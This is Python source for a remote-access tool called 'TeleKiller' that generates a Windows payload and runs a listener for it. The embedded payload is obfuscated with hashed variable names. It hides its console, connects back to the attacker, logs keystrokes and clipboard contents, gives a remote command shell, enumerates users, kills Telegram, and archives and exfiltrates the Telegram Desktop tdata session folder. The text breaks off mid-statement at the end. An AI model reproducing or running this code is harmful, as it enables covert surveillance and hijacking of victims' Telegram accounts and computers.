# -*- coding: UTF-8 -*-
import socket
from os import system,popen,path
import sys
from colorama import Fore,init,Back
from random import random
import time
init(autoreset=True)
def download_tdata(client,file_save):
    data_file=client.recv(1024)
    while(data_file):
        if 'pishmarg' in data_file:
            break
        else:
            file_save.write(data_file)
            data_file=victim.recv(1024)
    data_file=data_file.replace('pishmarg','')
    if len(data_file)!=0:
        file_save.write(data_file)
def check_integer(num):
    try:
        int(num)
    except:
        return False
    else:
        return True
def shell_or_keylogger(client):
    print Fore.BLACK+"#"*39
    print Fore.WHITE+"ID\tItem"
    print Fore.WHITE+"===\t===="
    print Fore.GREEN+"[0]\t"+Fore.YELLOW+"Keylogger"
    print Fore.GREEN+"[1]\t"+Fore.YELLOW+"Shell\n"
    print Fore.WHITE+"\n====\t====\n"+Fore.GREEN+"[99]"+Fore.YELLOW+"\texit\n"
    licen_item=0
    while True:
        try:
            soks=raw_input(Fore.CYAN+'SELECT> ')
        except:
            pass
        if soks=='1' or soks=='0':
            if soks=='0':
                try:
                    client.send('keylo')
                except:
                    print "\nSession Closed\n"
                    return False
                    break
                else:
                    licen_item=1
                    break
            elif soks=='1':
                try:
                    client.send('shell')
                except:
                    print "\nSession Closed\n"
                    return False
                    break
                else:
                    licen_item=2
                    break
        elif soks=='99':
            print
            break
        else:
            print "\nInvalid ID\n"
    if licen_item==1:
        try:
            save_file=raw_input('\nSave Logs?[y,n]')
        except:
            pass
        licen_lf=0
        if save_file in ['Y','y','yes','YES','Yes']:
            print "\nSave -> logs_file.txt"
            file_logs=open('logs_file.txt','a')
            file_logs.write('\n----------------------\n')
            licen_lf=1
        client.send('y')
        print 'For Stop Keylogger ---> [Ctrl + C]'
        print "\nSTART Keylogger"
        print "---------------"
        while True:
            try:
                while True:
                    client.send('n')
                    event_=client.recv(1024)
                    if event_=='null':
                        break
                    else:
                        if 'PID' in event_:
                            print event_.replace('null','')
                            if licen_lf==1:
                                file_logs.write('\n'+event_.replace('null','')+' ')
                        else:
                            if event_.replace('null','')!='':
                                print event_.replace('null','')
                                if licen_lf==1:
                                    file_logs.write(event_.replace('null','')+' ')    
            except socket.error:
                print 'Sesssin Closed'
                return False
                break
            except:
                print '\n\nSTOP Keylogger'
                client.send('not')
                return True
                break
        if licen_lf==1:
            file_logs.close()

        
    elif licen_item==2:
        print 'For Stop Shell ---> [type exit and enter]\n'
        print '\nSTART Shell'
        print '---------------'
        while True:
            my_path=client.recv(10240)
            if my_path!='null':
                break
        time.sleep(1)
        list_drive=client.recv(20).split(':')
        while True:
            try:
                cmd=raw_input(my_path+'>')
            except:
                pass
            cmd=cmd.replace('\"','').replace('\'','')
            try:
                if cmd[0:3]=='cd ' and len(cmd)>3:
                    client.send(cmd)
                    time.sleep(1)
                    res=client.recv(10240)
                    if res=='not':
                        print "The system cannot find the drive specified.\n"
                    else:
                        my_path=res
                elif cmd.upper()[0] in list_drive and cmd[1]==':' and len(cmd)==2:
                    client.send(cmd)
                    time.sleep(1)
                    res=client.recv(10240)
                    if res=='not':
                        print "The system cannot find the drive specified.\n"
                    else:
                        my_path=res

                elif cmd.split()[0]=='exit':
                    try:
                        client.send('break')
                        print '\n\nSTOP Shell'
                    except:
                        return False
                        break
                    else:
                        return True
                        break
                    
                else:
                    client.send(cmd)
                    time.sleep(1)
                    print client.recv(10240)
            except socket.error:
                print 'Sesssin Closed'	
                return False
                break
            except:
                client.send('break')
                print 'STOP Shell'
                return True
                break
def banner():
    if sys.platform[0:3]=='win':
        system('cls')
    else:
        exit()
    print Fore.GREEN+u"""  ╔══════════════════════════════════════════════════════════════════════════════════╗
  ║ \x1b[36m████████╗███████╗██╗     ███████╗    ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗ \x1b[32m ║
  ║ \x1b[36m╚══██╔══╝██╔════╝██║     ██╔════╝    ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗ \x1b[32m║
  ║    \x1b[36m██║   █████╗  ██║     █████╗      █████╔╝ ██║██║     ██║     █████╗  ██████╔╝\x1b[32m ║
  ║    \x1b[36m██║   ██╔══╝  ██║     ██╔══╝      ██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗\x1b[32m ║
  ║    \x1b[36m██║   ███████╗███████╗███████╗    ██║  ██╗██║███████╗███████╗███████╗██║  ██║\x1b[32m ║
  ║    \x1b[36m╚═╝   ╚══════╝╚══════╝╚══════╝    ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝\x1b[32m ║
  ╚═╦═╦═╦═╦═╦═╦═╦═╦═╦═╦═╦═╦═╦═╦═╦═╦═╦═╦═╦═╦═╦═╦═╦════════════════════════════════════╝
  ╔═╩═╩═╩═╩═╩═╩═╩═╩═╩═╩═╩═╩═╩═╩═╩═╩═╩═╩═╩═╩═╩═╩═╩═╗
  ║\x1b[33m WebSite : UltraSec.org\x1b[32m                        ║
  ║\x1b[33m Channel : @UltraSecurity\x1b[32m                      ║
  ║\x1b[33m Developers : Ashkan Moghaddas , Behzad Magzer\x1b[32m ║
  ╚═══════════════════════════════════════════════╝
\n\x1b[37m  OPTIONS:\n\n\t(\x1b[41m1\x1b[0m) \x1b[37mGenerate\n\n\t(\x1b[41m2\x1b[0m) \x1b[37mListening\n\n\t(\x1b[41m3\x1b[0m) \x1b[37mExit\n"""



def check_install_module():
    pip_install=popen('pip freeze').read()
    list_module=[
        'altgraph'
        ,'colorama'
        ,'dis3'
        ,'future'
        ,'macholib'
        ,'pefile'
        ,'pywin32-ctypes'
        ,'PyInstaller'
        ,'pyHook'
        ,'pywin32==220']
    lfm=[]
    for m in list_module:
        if m not in pip_install:
            lfm.append(m)
    if len(lfm)!=0:
        system('cls')
        print Fore.WHITE+"="*31
        for fi in lfm:
            print fi.replace('==220',''),'-> Not Installed'
        print Fore.WHITE+"="*31
        try:
            raw_input()
        except:
            pass
        exit()
check_install_module()
banner()
while True:
    try:
        cmd=raw_input(Fore.MAGENTA+'UltraSec@TeleKiller\x1b[37m:\x1b[34m~\x1b[37m#\x1b[0m ')
    except:
        banner()
    if cmd=='3':
        break
    elif cmd=='2':
        print
        lhost=raw_input(Fore.RED+'LHOST-> ')
        if lhost=='':
            lhost=socket.gethostbyname(socket.gethostname())
            print Fore.GREEN+'\nDefault LHOST : %s\n'%(lhost)
        else:
            print Fore.GREEN+'\nLHOST : '+lhost+'\n'
        lport=raw_input(Fore.RED+'LPORT-> ')
        if lport=='':
            lport=4444
            print Fore.GREEN+'\nDefault LPORT : 4444\n'
        else:
            print Fore.GREEN+'\nLPORT : '+lport+'\n'
        if check_integer(lport)==True:    
            server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            try:
                lport=int(lport)
                server.bind((lhost,lport))
            except socket.error:
                print Fore.RED+'[!]\x1b[0mCan\'t Bind %s:%s'%(lhost,lport)    
            else:
                try:
                    print Fore.RED+'\nListening'
                    print Fore.CYAN+'[#]\x1b[37m%s:%s\x1b[0m'%(lhost,lport)
                    server.listen(1)
                except:
                    print Fore.RED+'[!]\x1b[0mCan\'t Listen %s:%s'%(lhost,lport)
                else:
                    victim,addr=server.accept()
                    hostname=victim.recv(1024)
                    os_name=victim.recv(1024)
                    print Fore.BLUE+'\n[*]\x1b[37mSession OPENED\x1b[0m'
                    print Fore.BLUE+'[*]\x1b[37mVictim IP(%s)\x1b[0m'%(addr[0])
                    print Fore.BLUE+'[*]\x1b[37mHostname (%s)\x1b[0m'%(hostname)
                    print Fore.BLUE+'[*]\x1b[37mOS name (%s)\x1b[0m'%(os_name)
                    print Fore.WHITE+'\nID\tUser List\n===\t========='
                    user_list=victim.recv(10240)
                    id_user=0
                    user_list=user_list.split()
                    for user in user_list:
                        print Fore.GREEN+'['+str(id_user)+']\t'+Fore.YELLOW+user
                        id_user+=1
                    print
                    print Fore.WHITE+'\n====\t====\n'+Fore.GREEN+'[99]\t'+Fore.YELLOW+'exit'
                    print
                    
                    licen_download_tdata=''
                    while True:
                        try:
                            select_user=raw_input(Fore.CYAN+'SELECT> ')
                        except:
                            pass
                        if select_user=='99':
                            victim.send('break')
                            break
                        elif check_integer(select_user)==True:
                            if int(select_user)==0 or int(select_user)<=id_user:
                                try:
                                    victim.send(user_list[int(select_user)])
                                except:
                                    print "\nSession Closed\n"
                                    break
                                else:
                                    licen_download_tdata=victim.recv(3)
                                    if licen_download_tdata=='yes':
                                        break
                                    else:
                                        print '\n'+user_list[int(select_user)]+' Has Not Telegram\n'
                            else:
                                print "\nInvalid ID\n"
                        else:
                            print "\nInvalid ID\n"
                    if licen_download_tdata=='yes':
                        print Fore.MAGENTA+'\nStart Download (TDATA) Folder\n'+Fore.GREEN+'============================='
                        print ''
                        random_name='tdata_'+str(random()).replace('0.','')+'.tar.bz2'
                        popen('mkdir downloads').read()
                        f=open('./downloads/'+random_name,'wb')
                        download_tdata(victim,f)
                        f.close()
                        print Fore.BLUE+'Save -> downloads/'+random_name
                        print Fore.GREEN+'\n=============================\n'
                    print 
                    while True:
                        try:
                            qks=raw_input('You Can Access Shell Or Keylogger?[y/n]')
                        except:
                            pass
                        if qks in ['YES','yes','Yes','y','Y']:
                            session_status=shell_or_keylogger(victim)
                            if session_status==True:
                                pass
                            else:
                                break
                        elif qks in ['N','n','No','NO','no']:
                            break
                        else:
                            print "\nInvalid : Enter y OR n\n"                                        
    elif cmd=='1':
        print
        lhost=raw_input(Fore.GREEN+'LHOST-> ')
        if lhost=='':
            sfgl=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            sfgl.connect(('8.8.8.8',80))
            lhost=sfgl.getsockname()[0]
            sfgl.close()
            print Fore.RED+'\nDefault LHOST : '+lhost+'\n'
        else:
            print Fore.RED+'\nLHOST : '+lhost+'\n'
        lport=raw_input(Fore.GREEN+'LPORT-> ')
        if lport=='':
            lport=4444
            print Fore.RED+'\nDefault LPORT : 4444\n'
        else:
            print Fore.RED+'\nLPORT : '+lport+'\n'
        payload_name=raw_input(Fore.GREEN+'NAME-> ')
        if payload_name=='':
            payload_name='payload'
            print Fore.RED+'\nDefault NAME : payload\n'
        else:
            print Fore.RED+'\nNAME : '+payload_name+'\n'
        source_payload='from ctypes import *\r\nimport time\r\nfrom subprocess import PIPE,Popen\r\nfrom win32clipboard import OpenClipboard,CloseClipboard,GetClipboardData\r\nfrom win32console import GetConsoleWindow\r\nfrom pythoncom import PumpWaitingMessages\r\nfrom win32gui import ShowWindow\r\nfrom socket import socket,AF_INET,SOCK_STREAM,gethostname\r\nfrom shutil import make_archive\r\nfrom pyHook import HookManager\r\nfrom os import system,popen,path,chdir\r\nfrom threading import Thread\r\ndef a88f05b6c963e145a45b58c47cd42a41():\r\n    b5b8c74cbd96fbf2de4c1a3527b2fbf4=GetConsoleWindow()\r\n    ShowWindow(b5b8c74cbd96fbf2de4c1a3527b2fbf4,0)\r\n    return True\r\na88f05b6c963e145a45b58c47cd42a41()\r\nb3c7cbace395d8b182dbb7ae2c3bfb34=socket(AF_INET,SOCK_STREAM)\r\nb3c7cbace395d8b182dbb7ae2c3bfb34.connect((\'{}\',{}))\r\ndef cefda4932d283cb7f67b9f73fb6e0f14():\r\n    d21dbd2c4e178b2cb55dce0c6a43effc=windll.user32\r\n    b0484c19f1afdaf3841a0d821ed393d2=windll.kernel32\r\n    b0180794a2f65cf48e8d77729a05b926=windll.psapi\r\n    global dea181b04ba971dfa9667785debd1ba7\r\n    dea181b04ba971dfa9667785debd1ba7=None\r\n    def b33530fd4c255242ea04c06ab6895b45():\r\n        b25ffa68ad761f8578cc61700c0140ed=d21dbd2c4e178b2cb55dce0c6a43effc.GetForegroundWindow()\r\n        bdb32b9e1adc6d67be435a81baf9a66e=c_ulong(0)\r\n        d21dbd2c4e178b2cb55dce0c6a43effc.GetWindowThreadProcessId(b25ffa68ad761f8578cc61700c0140ed,byref(bdb32b9e1adc6d67be435a81baf9a66e))\r\n        c9cf7ee85456cd274986e0e317358174="%d"%bdb32b9e1adc6d67be435a81baf9a66e.value\r\n        ee7004c7949d83f130592f15d98ca343=create_string_buffer("\\x00"*512)\r\n        b1c18a5e5fa78d7980e81f27c5286002=b0484c19f1afdaf3841a0d821ed393d2.OpenProcess(0x400|0x10,False,bdb32b9e1adc6d67be435a81baf9a66e)\r\n        b0180794a2f65cf48e8d77729a05b926.GetModuleBaseNameA(b1c18a5e5fa78d7980e81f27c5286002,None,byref(ee7004c7949d83f130592f15d98ca343),512)\r\n        b7d36dcb6d03b8fa977d80032a6bb990=create_string_buffer("\\x00"*512)\r\n        bfa47f7c65fec19cc163b1957b5e3844=d21dbd2c4e178b2cb55dce0c6a43effc.GetWindowTextA(b25ffa68ad761f8578cc61700c0140ed,byref(b7d36dcb6d03b8fa977d80032a6bb990),512)\r\n        fdf206e60de0ef6aa76cb2398adecd4d="<PID %s> - %s - %s "%(c9cf7ee85456cd274986e0e317358174,ee7004c7949d83f130592f15d98ca343.value,b7d36dcb6d03b8fa977d80032a6bb990.value)\r\n        b3c7cbace395d8b182dbb7ae2c3bfb34.send(fdf206e60de0ef6aa76cb2398adecd4d)\r\n    def b954f27ca739ea6b036fcb11d43427a1(event):\r\n        global bcdb92b7b97ef94b9ae4479d3f4ef0fc\r\n        global dea181b04ba971dfa9667785debd1ba7\r\n        if event.WindowName!=dea181b04ba971dfa9667785debd1ba7:\r\n            dea181b04ba971dfa9667785debd1ba7=event.WindowName\r\n            b33530fd4c255242ea04c06ab6895b45()\r\n        if event.Ascii>=33 and event.Ascii<=126:\r\n            b4f802ebfba977727845e8872cb743a7=chr(event.Ascii)\r\n            if len(b4f802ebfba977727845e8872cb743a7)==1:\r\n                b4f802ebfba977727845e8872cb743a7=b4f802ebfba977727845e8872cb743a7.upper()\r\n        else:\r\n            b4f802ebfba977727845e8872cb743a7=event.Key\r\n            if len(b4f802ebfba977727845e8872cb743a7)==1:\r\n                b4f802ebfba977727845e8872cb743a7=b4f802ebfba977727845e8872cb743a7.upper()\r\n            if b4f802ebfba977727845e8872cb743a7==\'Tab\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<Tab>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Lcontrol\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<L Control>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Rcontrol\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<R Control>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Capital\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<Caps Lock>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Lmenu\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<L Alt>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Rmenu\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<R Alt>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Lwin\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<L Win>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Escape\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<Escape>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Rshift\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<R Shift>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Lshift\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<L Shift>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Left\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<Left>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Up\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<Up>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Down\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<Down>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Right\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<Right>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Delete\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<Del>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Insert\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<Ins>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Oem_Plus\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<+>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Oem_Minus\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<->\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'End\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<End>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Next\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<Next>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Home\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<Home>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Clear\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<Clear>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Space\':\r\n            \tb4f802ebfba977727845e8872cb743a7=\'<Space>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Prior\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<Prior>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Numlock\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<Num lock>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Snapshot\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<Snapshot>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Back\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<Back Space>\'\r\n            if b4f802ebfba977727845e8872cb743a7==\'Return\':\r\n                b4f802ebfba977727845e8872cb743a7=\'<Enter>\'\r\n            if b4f802ebfba977727845e8872cb743a7[0]==\'F\' and len(b4f802ebfba977727845e8872cb743a7)==2 or b4f802ebfba977727845e8872cb743a7 in [\'F12\',\'F11\',\'F10\'] :\r\n                b4f802ebfba977727845e8872cb743a7=\'<\'+b4f802ebfba977727845e8872cb743a7+\'>\'\r\n        bcdb92b7b97ef94b9ae4479d3f4ef0fc=bcdb92b7b97ef94b9ae4479d3f4ef0fc+b4f802ebfba977727845e8872cb743a7\r\n        b3c7cbace395d8b182dbb7ae2c3bfb34.send(bcdb92b7b97ef94b9ae4479d3f4ef0fc)\r\n        if bcdb92b7b97ef94b9ae4479d3f4ef0fc==\'V\':\r\n            OpenClipboard()\r\n            try:\r\n                b62a04d2d4b82bfc1e10bb49c416e705=\'<Clipboard:\'+GetClipboardData()+\'>\'\r\n            except:\r\n                b62a04d2d4b82bfc1e10bb49c416e705=\'<Clipboard:ONE FILE PASTED>\'\r\n            b3c7cbace395d8b182dbb7ae2c3bfb34.send(b62a04d2d4b82bfc1e10bb49c416e705)\r\n            CloseClipboard()\r\n        bcdb92b7b97ef94b9ae4479d3f4ef0fc=\'\'\r\n    global bcdb92b7b97ef94b9ae4479d3f4ef0fc\r\n    bcdb92b7b97ef94b9ae4479d3f4ef0fc=\'\'\r\n    be8f80182e0c983916da7338c2c1c040=HookManager()\r\n    be8f80182e0c983916da7338c2c1c040.KeyDown=b954f27ca739ea6b036fcb11d43427a1\r\n    be8f80182e0c983916da7338c2c1c040.HookKeyboard()\r\n    while True:\r\n        b277e0910d750195b44b797616e091ad=b3c7cbace395d8b182dbb7ae2c3bfb34.recv(3)\r\n        if b277e0910d750195b44b797616e091ad==\'not\':\r\n            break\r\n        try:\r\n            b3c7cbace395d8b182dbb7ae2c3bfb34.send(\'null\')\r\n        except:\r\n        \tpass\r\n        PumpWaitingMessages()\r\ndef bedc6d1c31802fb5f8093a2a0fbe7f1d(cf1e8c14e54505f60aa10ceb8d5d8ab3):\r\n\tcf1e8c14e54505f60aa10ceb8d5d8ab3.send(popen(\'cd\').read().replace(\'\\n\',\'\'))\r\n\tbd54dae327eb0f2f1af1d6b8308b43bf=popen(\'wmic logicaldisk get name\').read().replace(\'\\n\',\'\').replace(\'\\r\',\'\').replace(\' \',\'\').replace(\'Name\',\'\')[:-1]\r\n\tcf1e8c14e54505f60aa10ceb8d5d8ab3.send(bd54dae327eb0f2f1af1d6b8308b43bf)\r\n\tbd54dae327eb0f2f1af1d6b8308b43bf=bd54dae327eb0f2f1af1d6b8308b43bf.split(\':\')\r\n\twhile True:\r\n\t\te22d1158ddbc0d305521e03ebf67c940=cf1e8c14e54505f60aa10ceb8d5d8ab3.recv(10240)\r\n\t\tif e22d1158ddbc0d305521e03ebf67c940.split()[0]==\'exit\':\r\n\t                break\r\n\t\tif e22d1158ddbc0d305521e03ebf67c940[0:3]==\'cd \' and len(e22d1158ddbc0d305521e03ebf67c940)>3:\r\n\t\t\ttry:\r\n\t\t\t\tchdir(e22d1158ddbc0d305521e03ebf67c940[3:])\r\n\t\t\texcept:\r\n\t\t\t\tcf1e8c14e54505f60aa10ceb8d5d8ab3.send(\'not\')\r\n\t\t\telse:\r\n\t\t\t\tcf1e8c14e54505f60aa10ceb8d5d8ab3.send(popen(\'cd\').read().replace(\'\\n\',\'\'))\r\n\t\telif e22d1158ddbc0d305521e03ebf67c940[0].upper() in bd54dae327eb0f2f1af1d6b8308b43bf and e22d1158ddbc0d305521e03ebf67c940[1]==\':\' and len(e22d1158ddbc0d305521e03ebf67c940)==2:\r\n\t\t\tprint e22d1158ddbc0d305521e03ebf67c940[0:2]\r\n\t\t\ttry:\r\n\t\t\t\tchdir(e22d1158ddbc0d305521e03ebf67c940[0:2])\r\n\t\t\texcept:\r\n\t\t\t\tcf1e8c14e54505f60aa10ceb8d5d8ab3.send(\'not\')\r\n\t\t\telse:\r\n\t\t\t\tcf1e8c14e54505f60aa10ceb8d5d8ab3.send(popen(\'cd\').read().replace(\'\\n\',\'\'))\r\n\t\telif e22d1158ddbc0d305521e03ebf67c940.split()[0]==\'break\':\r\n\t\t\tbreak\r\n\t\telse:  \r\n\t\t\tb4a88417b3d0170d754c647c30b7216a=Popen(e22d1158ddbc0d305521e03ebf67c940.split(),stdout=PIPE,stderr=PIPE,shell=True)\r\n\t\t\tc691f4f0391daffaf07b1aae26afe284=list(b4a88417b3d0170d754c647c30b7216a.communicate())\r\n\t\t\ttime.sleep(1)\r\n\t\t\tif c691f4f0391daffaf07b1aae26afe284[0]!=\'\':\r\n\t\t\t\tcf1e8c14e54505f60aa10ceb8d5d8ab3.send(c691f4f0391daffaf07b1aae26afe284[0])\r\n\t\t\telif c691f4f0391daffaf07b1aae26afe284[1]!=\'\':\r\n\t\t\t\tcf1e8c14e54505f60aa10ceb8d5d8ab3.send(c691f4f0391daffaf07b1aae26afe284[1])\r\n\t\t\telse:\r\n\t\t\t\tcf1e8c14e54505f60aa10ceb8d5d8ab3.send(\'\\n\')\r\ndef b9a960b9fa32b73b073cbeeb8778bc07(bacb3a53bbc6cb5e6dc33b8894fb9273,cf1e8c14e54505f60aa10ceb8d5d8ab3):\r\n        def d81b319acd5cde0c43519a80a0cc73da(d0d38ad301246b77fbc4ba4881d40d48):\r\n            make_archive(\'C:\\\\Users\\\\\'+d0d38ad301246b77fbc4ba4881d40d48+\'\\\\AppData\\\\Roaming\\\\tdata\', format="bztar", root_dir=\'C:\\\\Users\\\\\'+d0d38ad301246b77fbc4ba4881d40d48+\'\\\\AppData\\\\Roaming\\\\Telegram Desktop\\\\tdata\\\\\')\r\n        d6e1ca84308e59169ffc76620d290136=Thread(target=d81b319acd5cde0c43519a80a0cc73da,args=(bacb3a53bbc6cb5e6dc33b8894fb9273,))\r\n        d6e1ca84308e59169ffc76620d290136.run()\r\n\tbfa14cdd754f91cc6554c9e71929cce7=open(\'C:\\\\Users\\\\\'+bacb3a53bbc6cb5e6dc33b8894fb9273+\'\\\\AppData\\\\Roaming\\\\tdata.tar.bz2\',\'rb\')\r\n\tb9ca76e40bd85486be59b0cdbe8de29a=bfa14cdd754f91cc6554c9e71929cce7.read(1024)\r\n\twhile b9ca76e40bd85486be59b0cdbe8de29a:\r\n\t\tcf1e8c14e54505f60aa10ceb8d5d8ab3.send(b9ca76e40bd85486be59b0cdbe8de29a)\r\n\t\tb9ca76e40bd85486be59b0cdbe8de29a=bfa14cdd754f91cc6554c9e71929cce7.read(1024)\r\n\tcf1e8c14e54505f60aa10ceb8d5d8ab3.send(b9ca76e40bd85486be59b0cdbe8de29a+\'pishmarg\')\r\n\tbfa14cdd754f91cc6554c9e71929cce7.close()\r\n\tpopen(\'del /Q C:\\\\Users\\\\\'+bacb3a53bbc6cb5e6dc33b8894fb9273+\'\\\\AppData\\\\Roaming\\\\tdata.tar.bz2\')\r\ndef b99567fc82b671ea4bbe6c1f8864519b():\r\n\tif \'Telegram.exe\' in popen(\'tasklist\').read():\r\n\t\tbe366bd1bb675bd57058fd4664205d2a=popen(\'taskkill /F /IM Telegram.exe /T\').read()\r\n\t\tdel be366bd1bb675bd57058fd4664205d2a\r\ndef b4fe3e64ea8bb746756d4a7dea73d285(cf1e8c14e54505f60aa10ceb8d5d8ab3):\r\n\tb897acf49c7c1ea9f76efe59187aab46=gethostname()\r\n\tcf1e8c14e54505f60aa10ceb8d5d8ab3.send(b897acf49c7c1ea9f76efe59187aab46)\r\ndef bd6137dcd51ff11ce87f4b447b7514f3(cf1e8c14e54505f60aa10ceb8d5d8ab3):\r\n\tae3f135dfd5660fe4d35e91db1286117=popen(\'systeminfo | findstr /B /C:\\"OS Name"\').read()\r\n\tb4e5375fba9e1b1181d3bde6bdb98db9=ae3f135dfd5660fe4d35e91db1286117.replace(\'OS Name:                   \',\'\').replace(\'\\n\',\'\')\r\n\tcf1e8c14e54505f60aa10ceb8d5d8ab3.send(b4e5375fba9e1b1181d3bde6bdb98db9)\r\ndef db63e160e64b2c4cc5d80deac01c8989(cf1e8c14e54505f60aa10ceb8d5d8ab3):\r\n\tb897acf49c7c1ea9f76efe59187aab46=gethostname()\r\n\tbbbb4effe4a349c6dd82ad4f4f21d34c=popen(\'net user\').read()\r\n\tbbbb4effe4a349c6dd82ad4f4f21d34c=bbbb4effe4a349c6dd82ad4f4f21d34c.replace(\'-------------------------------------------------------------------------------\',\'\')\r\n\tbbbb4effe4a349c6dd82ad4f4f21d34c=bbbb4effe4a349c6dd82ad4f4f21d34c.replace(\'The command completed successfully.\\n\',\'\')\r\n\tbbbb4effe4a349c6dd82ad4f4f21d34c=bbbb4effe4a349c6dd82ad4f4f21d34c.replace(\'User accounts for \\\\\\\\\'+b897acf49c7c1ea9f76efe59187aab46,\'\')\r\n\tbbbb4effe4a349c6dd82ad4f4f21d34c=bbbb4effe4a349c6dd82ad4f4f21d34c.replace(\'Guest\',\'\')\r\n\tbbbb4effe4a349c6dd82ad4f4f21d34c=bbbb4effe4a349c6dd82ad4f4f21d34c.replace(\'DefaultAccount\',\'\')\r\n\tbbbb4effe4a349c6dd82ad4f4f21d34c=bbbb4effe4a349c6dd82ad4f4f21d34c.replace(\'Administrator\',\'\')\r\n\tbbbb4effe4a349c6dd82ad4f4f21d34c=bbbb4effe4a349c6dd82ad4f4f21d34c.replace(\'WDAGUtilityAccount\',\'\')\r\n\tbbbb4effe4a349c6dd82ad4f4f21d34c=bbbb4effe4a349c6dd82ad4f4f21d34c.replace(\'\\n\\n\\n\\n\',\'\')\r\n\tbbbb4effe4a349c6dd82ad4f4f21d34c=bbbb4effe4a349c6dd82ad4f4f21d34c.split(\'  \')\r\n\tbbbb4effe4a349c6dd82ad4f4f21d34c=list(set(bbbb4effe4a349c6dd82ad4f4f21d34c))\r\n\tif \'\' in bbbb4effe4a349c6dd82ad4f4f21d34c:\r\n\t    del bbbb4effe4a349c6dd82ad4f4f21d34c[bbbb4effe4a349c6dd82ad4f4f21d34c.index(\'\')]\r\n\tfor b65c0c0b4ab0e063e5caa33b7c1ab741 in bbbb4effe4a349c6dd82ad4f4f21d34c:\r\n\t    if \'\\n\' in b65c0c0b4ab0e063e5caa33b7c1ab741:\r\n\t\t\tdel bbbb4effe4a349c6dd82ad4f4f21d34c[bbbb4effe4a349c6dd82ad4f4f21d34c.index(b65c0c0b4ab0e063e5caa33b7c1ab741)]\r\n\tbbbb4effe4a349c6dd82ad4f4f21d34c=str(bbbb4effe4a349c6dd82ad4f4f21d34c).replace(\'[\',\'\').replace(\']\',\'\').replace(\',\',\'\').replace(\'\\\'\',\'\')\r\n\tcf1e8c14e54505f60aa10ceb8d5d8ab3.send(bbbb4effe4a349c6dd82ad4f4f21d34c)\r\nb4fe3e64ea8bb746756d4a7dea73d285(b3c7cbace395d8b182dbb7ae2c3bfb34)\r\nbd6137dcd51ff11ce87f4b447b7514f3(b3c7cbace395d8b182dbb7ae2c3bfb34)\r\ndb63e160e64b2c4cc5d80deac01c8989(b3c7cbace395d8b182dbb7ae2c3bfb34)\r\nb0723c29c59c0fed25a7324a0ee4096b=0\r\nwhile True:\r\n\tee11cbb19052e40b07aac0ca060c23ee=b3c7cbace395d8b182dbb7ae2c3bfb34.recv(1024)\r\n\tif path.isdir(\'C:\\\\Users\\\\\'+ee11cbb19052e40b07aac0ca060c23ee+\'\\\\AppData\\\\Roaming\\\\Telegram Desktop\\\\tdata\')==True:\r\n\t\tb0723c29c59c0fed25a7324a0ee4096b=1\r\n\t\tb3c7cbace395d8b182dbb7ae2c3bfb34.send(\'yes\')\r\n\t\tbreak\r\n\telif ee11cbb19052e40b07aac0ca060c23ee==\'break\':\r\n\t\tbreak \r\n\telse:\r\n\t\tb3c7cbace395d8b182dbb7ae2c3bfb34.send(\'not\')\r\nif b0723c29c59c0fed25a7324a0ee4096b==1:\r\n\tb99567fc82b671ea4bbe6c1f8864519b()\r\n\tb9a960b9fa32b73b073cbeeb8778bc07(ee11cbb19052e40b07aac0ca060c23ee,b3c7cbace395d8b182dbb7ae2c3bfb34)\r\nwhile 